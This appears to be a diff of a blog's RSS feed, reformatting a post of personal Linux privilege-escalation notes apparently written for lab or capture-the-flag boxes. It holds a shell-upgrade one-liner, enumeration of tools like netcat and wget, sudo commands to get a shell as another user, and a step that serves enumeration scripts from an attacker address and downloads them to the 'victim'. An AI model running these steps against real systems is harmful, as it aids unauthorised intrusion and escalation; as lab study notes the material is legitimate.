@@ -165,16 +165,14 @@ docker-compose down
 &lt;span class="c1"&gt;# Must be in same folder as docker-compose.yml&lt;/span&gt;
 docker-compose ps
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">Daniel Haggerty</dc:creator><pubDate>Sat, 18 Jan 2020 00:00:00 -0600</pubDate><guid isPermaLink="false">tag:None,2020-01-18:/docker-commands.html</guid><category>Docker</category><category>Docker</category></item><item><title>"Linux Privilege Escalation"</title><link>/linux-privilege-escalation.html</link><description>&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;privesc_linux&lt;/span&gt;
-&lt;span class="n"&gt;UPGRADE&lt;/span&gt; &lt;span class="n"&gt;SHELL&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="err"&gt;‘&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pty&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;pty&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;spawn&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="err"&gt;’&lt;/span&gt;
+&lt;span class="n"&gt;UPGRADE&lt;/span&gt; &lt;span class="n"&gt;SHELL&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
 &lt;span class="n"&gt;ctrl&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;Z&lt;/span&gt;
 &lt;span class="n"&gt;stty&lt;/span&gt; &lt;span class="n"&gt;raw&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;echo&lt;/span&gt;
 &lt;span class="n"&gt;fg&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Enumerate and run this:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2&amp;gt;/dev/null&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
+&lt;p&gt;&lt;code&gt;which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;If you don’t see a compiler such as GCC, you know it’s probably not going to be a kernel exploit. So enumerate and use
 LinEnum.sh or Linuxprivescchecker.py. I found on one of my 20 point boxes it only perl and wget, so I was looking for priv esc
 related to perl. The other 20 pointer had GCC, so I googled a linux exploit, 2 minutes later I am root.
@@ -187,11 +185,9 @@ BY HAND
 6. ps aux | grep root == john mysql -u root
 7. If webserver poke around database
 8. Look at original nmap scan for other shite running (nmap localhost)&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;sudo -u anotheruser command run sommand as another user&lt;/span&gt;
-&lt;span class="err"&gt;sudo -u scriptmanager bash -i #run shell as user scriptmanager&lt;/span&gt;
-&lt;span class="err"&gt;which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp 2&amp;gt;/dev/null&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-
+&lt;p&gt;&lt;code&gt;sudo -u anotheruser command run sommand as another user
+sudo -u scriptmanager bash -i #run shell as user scriptmanager
+which awk perl python ruby gcc cc vi vim nmap find netcat nc wget curl tftp ftp 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;DOWNLOAD ALL LINUX ENUM FILES TO VICTIM cd /opt/linux_privesc
 python -m SimpleHTTPServer
 wget -r 10.10.14.7:8000
